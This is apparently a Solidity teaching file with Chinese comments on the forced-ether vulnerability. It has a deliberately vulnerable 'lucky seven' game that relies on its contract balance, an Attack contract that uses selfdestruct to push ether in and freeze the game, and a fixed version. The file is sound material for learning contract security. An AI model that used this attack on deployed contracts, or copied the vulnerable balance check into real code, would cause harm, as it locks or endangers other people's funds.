// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// 幸运七游戏合约
contract EtherGame {
    // 每轮游戏的目标金额
    uint256 private constant TARGET_AMOUNT = 7 ether;

    // 赢家地址
    address public winner;

    // 存入以太，玩游戏
    function deposit() public payable {
        // 只允许玩家存入1个ether
        require(msg.value == 1 ether, "You can only send 1 Ether");

        // 获取合约余额
        // !不要以合约账户的余额作为判断条件
        uint256 balance = address(this).balance;

        // 如果合约余额小于等于7个ether，就继续向下运行，否则拒绝当前玩家，以太退回
        require(balance <= TARGET_AMOUNT, "Game is over");

        // 如果合约余额等于7个ether，那么本次存入以太的人，就是赢家
        if (balance == TARGET_AMOUNT) {
            winner = msg.sender;
        }
        // 如果合约余额不等于7个ether，也就是小于7
        // 那么本次存入以太的人，就是输家，以太被没收，游戏继续
    }

    // 赢家申请取走奖励
    function claimReward() public {
        // 判断是否为赢家，输家调用返回 "Not winner"
        require(msg.sender == winner, "Not winner");

        // 给赢家发送合约中的全部ether
        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");

        // 赢家地址清零
        winner = address(0);
    }

    // 查看合约余额
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract Attack {
    // 构造函数，设置为payable, 部署合约时，先存入7个以太
    constructor() payable {}

    // 攻击函数，参数为目标合约地址，合约地址会有7个以太，陷入瘫痪
    function attack(address _target) external {
        selfdestruct(payable(_target));
    }

    // 查看合约余额
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract ImprovedGame {
    // 每轮游戏的目标金额
    uint256 private constant TARGET_AMOUNT = 7 ether;

    // 赢家地址
    address public winner;

    // 账户余额
    uint256 private balance;

    // 存入以太，玩游戏
    function deposit() public payable {
        // 只允许玩家存入1个ether
        require(msg.value == 1 ether, "You can only send 1 Ether");

        // 合约余额累加本次投注
        balance += msg.value;

        // 如果合约余额小于等于7个ether，就继续向下运行，否则拒绝当前玩家，以太退回
        require(balance <= TARGET_AMOUNT, "Game is over");

        // 如果合约余额等于7个ether，那么本次存入以太的人，就是赢家
        if (balance == TARGET_AMOUNT) {
            winner = msg.sender;
        }
        // 如果合约余额不等于7个ether，也就是小于7
        // 那么本次存入以太的人，就是输家，以太被没收，游戏继续
    }

    // 赢家申请取走奖励
    function claimReward() public {
        // 判断是否为赢家，输家调用返回 "Not winner"
        require(msg.sender == winner, "Not winner");

        // 合约账户余额清零
        balance = 0;

        // 赢家地址清零
        winner = address(0);

        // 给赢家发送合约中的全部ether
        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }

    // 查看变量余额和合约余额
    function getBalance()
        public
        view
        returns (uint256 varBalance, uint256 realBalance)
    {
        return (balance, address(this).balance);
    }
}
